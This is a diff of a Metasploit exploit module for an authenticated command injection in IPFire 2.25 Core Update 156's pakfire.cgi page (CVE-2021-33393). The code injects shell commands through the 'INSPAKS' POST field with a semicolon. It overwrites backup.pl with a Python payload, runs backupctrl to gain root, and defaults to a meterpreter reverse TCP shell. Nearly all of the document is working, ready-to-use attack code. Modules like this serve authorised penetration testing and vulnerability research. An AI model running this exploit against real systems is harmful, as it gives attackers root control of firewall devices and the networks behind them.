@@ -3,44 +3,59 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-###
-#
-# oThis explit execute arbitrary code on ipfire 2.25 core update 156
-# a bug is blind os command injection
-#
-###
 class MetasploitModule < Msf::Exploit::Remote
-  Rank = NormalRanking
+  Rank = ExcellentRanking
 
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+  prepend Msf::Exploit::Remote::AutoCheck
 
   def initialize(info = {})
     super(
       update_info(
         info,
-        'Name' => 'ipfire 2.25 core 156 remote code execution',
-        'Description' => %q{This exploit execute arbitrary code on ipfire 2.25 core 156 as root.},
+        'Name' => 'IPFire 2.25 Core Update 156 and Prior pakfire.cgi Authenticated RCE',
+        'Description' => %q{
+          This module exploits an authenticated command injection vulnerability in the
+          /cgi-bin/pakfire.cgi web page of IPFire devices running versions 2.25 Core Update 156
+          and prior to execute arbitrary code as the root user.
+        },
         'License' => MSF_LICENSE,
         'Author' =>
           [
             'Mücahit Saratar <trregen222@gmail.com>', # vulnerability research & exploit development
+            'Grant Willcox' # Module enhancements and documentation fixes.
           ],
         'References' =>
           [
-            [ 'OSVDB', '' ],
-            [ 'EDB', '49869' ], # copied from exploit-db  https://www.exploit-db.com/exploits/49869
+            [ 'EDB', '49869' ],
+            [ 'CVE', '2021-33393'],
             [ 'URL', 'https://github.com/MucahitSaratar/ipfire-2-25-auth-rce'],
             [ 'URL', 'https://www.youtube.com/watch?v=5FUXV7dfNjg'],
-            [ 'CVE', '']
           ],
-        'Platform' => ['python'],
+        'Platform' => ['python' ],
         'Privileged' => true,
-        'Arch' => ARCH_PYTHON,
+        'Arch' => [ ARCH_PYTHON ],
         'Targets' =>
           [
-            [ 'Automatic Target', {}]
+            [
+              'Python Dropper',
+              {
+                'Platform' => 'python',
+                'Arch' => [ ARCH_PYTHON ],
+                'Type' => :unix_memory,
+                'DefaultOptions' => {
+                  'PAYLOAD' => 'python/meterpreter/reverse_tcp'
+                }
+              }
+            ]
           ],
-        'DisclosureDate' => '2021-06-22',
+        'DisclosureDate' => '2021-05-17',
+        'Notes' => {
+          'Reliability' => [ REPEATABLE_SESSION ],
+          'Stability' => [ CRASH_SAFE ],
+          'SideEffects' => [ CONFIG_CHANGES, IOC_IN_LOGS ]
+        },
         'DefaultTarget' => 0
       )
     )
@@ -48,8 +63,8 @@ class MetasploitModule < Msf::Exploit::Remote
       [
         Opt::RPORT(444),
         OptString.new('USERNAME', [ true, 'User to login with', 'admin']),
-        OptString.new('PASSWORD', [ true, 'Password to login with', ''])
-      ], self.class
+        OptString.new('PASSWORD', [ true, 'Password to login with', '']),
+      ]
     )
   end
 
@@ -57,71 +72,86 @@ class MetasploitModule < Msf::Exploit::Remote
     '/cgi-bin/pakfire.cgi' # vulnerable path
   end
 
-  def send_packet(metot, calistir = 'sleep 10', bekle = 20)
-    @baslik = {
+  def send_packet(method, execstr, waitsec)
+    myheaders = {
       'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
-      'Cache-Control' => 'max-age=0',
-      'User-Agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
-      'Origin' => "https://#{datastore['RHOST']}:#{datastore['RPORT']}",
-      'Sec-GPC' => '1',
-      'Sec-Fetch-Site' => 'same-origin',
-      'Upgrade-Insecure-Requests' => '1',
-      'Sec-Fetch-Mode' => 'navigate',
-      'Sec-Fetch-User' => '?1',
-      'Sec-Fetch-Dest' => 'document',
-      'Accept' => '*/*',
-      'Referer' => "https://#{datastore['RHOST']}:#{datastore['RPORT']}/",
-      'Accept-Encoding' => 'gzip, deflate',
-      'Accept-Language' => 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-      'Connection' => 'keep-alive',
-      'Content-Type' => 'application/x-www-form-urlencoded'
+      'Referer' => "https://#{datastore['RHOST']}:#{datastore['RPORT']}/"
     }
-    if metot == 'GET'
+    if method == 'GET'
       response = send_request_cgi(
         'uri' => vpath,
-        'headers' => @baslik,
-        'SSL' => true
+        'headers' => myheaders,
+        'SSL' => true,
+        'timeout' => waitsec
       )
     else
       response = send_request_cgi(
         'uri' => vpath,
-        'headers' => @baslik,
+        'headers' => myheaders,
         'SSL' => true,
         'method' => 'POST',
         'vars_post' => {
-          'INSPAKS' => "7zip-edited;#{calistir}",
+          'INSPAKS' => ";#{execstr}",
           'ACTION' => 'install',
-          'x' => '7',
-          'y' => '10'
+          'x' => Rex::Text.rand_text_numeric(2),
+          'y' => Rex::Text.rand_text_numeric(2)
         },
-        'timeout' => bekle
+        'timeout' => waitsec
       )
     end
-    return response
+    response
   end
 
   def check
-    vprint_status('checking app version')
-    cevap = send_packet('GET', '', 15)
-    @version = cevap.body.scan(/IPFire (.*) \(.*\) - Core Update [0-9]{3}/).flatten[0] || ''
-    @core = cevap.body.scan(/IPFire .* \(.*\) - Core Update (.*)/).flatten[0] || ''
-    if @core.to_i >= 157
-      Exploit::CheckCode::Safe
-    else
-      vprint_good('Target is vulnerable') if @core.to_i == 156
-      Exploit::CheckCode::Appears
+    cevap = send_packet('GET', '', 10)
+    if cevap.nil? || cevap.body.empty?
+      return CheckCode::Unknown('No response from the target!')
     end
+
+    unless cevap.body.scan(/401 Unauthorized/).empty?
+      return CheckCode::Unknown('Invalid credentials supplied! Check USERNAME and PASSWORD options!')
+    end
+
+    version = cevap.body.scan(/IPFire (.*) \(.*\) - Core Update [0-9]{3}/).flatten[0] || ''
+    core = cevap.body.scan(/IPFire .* \(.*\) - Core Update (.*)/).flatten[0] || ''
+    unless version
+      return CheckCode::Safe('Target is not IPFire')
+    end
+    if core.to_i >= 157
+      return CheckCode::Safe("Target is running IPFire #{version} (Core Update #{core})")
+    end
+
+    CheckCode::Appears("Target is running IPFire #{version} (Core Update #{core})")
   end
 
   def exploit
-    send_packet('POST', 'echo "#!/usr/bin/python" > /var/ipfire/backup/bin/backup.pl', 1)
-    vprint_status('first attempt done')
-    send_packet('POST', "echo \"__import__('os').setuid(0)\" >> /var/ipfire/backup/bin/backup.pl", 1)
-    vprint_status('setuid triger done')
-    send_packet('POST', "echo \"#{payload.encoded}\" >> /var/ipfire/backup/bin/backup.pl", 1)
-    vprint_status('payload sended')
-    send_packet('POST', '/usr/local/bin/backupctrl', 1)
-    vprint_status('payload triggered')
+    temp_backup_file = Rex::Text.rand_text_alphanumeric(5, 30)
+    print_status("Backing up backup.pl to /tmp/#{temp_backup_file}...")
+    if send_packet('POST', "cp /var/ipfire/backup/bin/backup.pl /tmp/#{temp_backup_file}", 1).nil?
+      fail_with(Failure::Unreachable, "#{peer} disconnected whilst trying to back up backup.pl!")
+    end
+
+    print_status('Overwriting the contents of backup.pl with a Python header statement')
+    if send_packet('POST', 'echo "#!/usr/bin/python" > /var/ipfire/backup/bin/backup.pl', 1).nil?
+      fail_with(Failure::Unreachable, "#{peer} disconnected whilst trying to overwrite backup.pl!")
+    end
+
+    print_status('Appending the contents of backup.pl with the Python code to be executed.')
+    if send_packet('POST', "echo \"#{payload.encoded}\" >> /var/ipfire/backup/bin/backup.pl", 1).nil?
+      fail_with(Failure::Unreachable, "#{peer} disconnected whilst trying to append to backup.pl!")
+    end
+
+    print_status('Executing /usr/local/bin/backupctrl to run the payload')
+    unless send_packet('POST', '/usr/local/bin/backupctrl', 1).nil?
+      fail_with(Failure::UnexpectedReply, 'Something went wrong, the server should not respond after we execute the payload.')
+    end
+
+    print_good('You should now have your shell, restoring the original contents of the backup.pl file...')
+    if send_packet('POST', "cp /tmp/#{temp_backup_file} /var/ipfire/backup/bin/backup.pl", 20).nil?
+      fail_with(Failure::Unreachable, "#{peer} disconnected whilst trying to restore backup.pl!")
+    end
+
+    print_status('All done, enjoy the shells!')
   rescue ::Rex::ConnectionError
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
   end
